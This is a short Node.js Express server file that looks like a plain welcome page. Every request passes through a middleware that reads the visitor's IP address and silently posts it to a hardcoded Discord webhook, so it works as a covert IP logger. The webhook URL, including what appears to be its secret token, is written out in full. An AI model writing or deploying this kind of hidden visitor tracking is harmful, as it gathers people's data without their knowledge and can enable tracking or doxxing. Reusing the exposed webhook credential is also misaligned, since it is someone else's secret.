const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Replace with your Discord webhook URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1356941695341563944/dPWIbkbLU3KcxoNadTC_Gr8PRTp3aiPh0NioCnQR53VG7HZK2n__HosyddAxL-w-ngtN';

app.use((req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Send IP to Discord webhook
    axios.post(DISCORD_WEBHOOK_URL, {
        content: `New visitor IP: ${ip}`
    })
    .then(response => {
        console.log('IP sent to Discord:', ip);
    })
    .catch(error => {
        console.error('Error sending IP to Discord:', error.response ? error.response.data : error.message);
    });

    next();
});

app.get('/', (req, res) => {
    res.send('Welcome to the website!');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
